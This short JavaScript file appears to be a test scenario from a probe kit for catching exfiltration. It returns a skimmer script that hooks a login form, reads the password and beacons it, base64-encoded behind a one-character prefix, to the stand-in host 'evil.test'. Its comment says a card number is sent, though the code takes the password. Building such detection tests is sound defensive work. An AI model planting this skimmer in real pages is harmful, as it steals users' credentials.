// Attack: the card number sent base64-encoded after a one-character prefix (an odd offset).
import { scenario } from './probe-kit.js';

export const respond = scenario((ctx) => `document.getElementById('login').addEventListener('submit', function () {
  var p = document.getElementById('password').value;
  navigator.sendBeacon('${ctx.origin('evil.test')}/b', btoa('x' + p));
});`);
